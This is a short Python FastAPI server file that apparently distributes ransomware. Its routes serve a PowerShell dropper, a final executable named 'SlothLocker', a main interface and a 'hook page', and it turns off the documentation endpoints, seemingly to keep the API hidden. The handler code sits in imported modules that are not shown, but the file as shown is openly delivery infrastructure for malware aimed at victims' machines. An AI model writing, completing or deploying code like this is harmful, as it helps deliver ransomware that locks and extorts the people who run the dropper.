import config
import automative_utils as utils
import endPointHandlers
import fastapi





app = fastapi.FastAPI(
    docs_url=None,      # Disables Swagger UI (/docs)
    redoc_url=None,     # Disables Redoc (/redoc)
    openapi_url=None    # Disables raw schema (/openapi.json)
)

@app.get(config.dropperEndpoint)
async def servePowerShellDropperFile(req:fastapi.Request):return await endPointHandlers.servePowerShellDropperFile(req)

@app.get(config.binEndpoint)
async def serveFinalSlothLockerDotEXE(req:fastapi.Request):return await endPointHandlers.serveFinalSlothLockerDotEXE(req)

@app.get(config.mainInterfaceEndpoint)
async def mainInterface(req:fastapi.Request):return await endPointHandlers.mainInterface(req)

@app.get(config.hookPageEndpoint)
async def releiveUser(req:fastapi.Request):return await endPointHandlers.serveSecondHTML(req)



utils.add_middlewares(app)
utils.ServerStartUp(__file__, __name__)



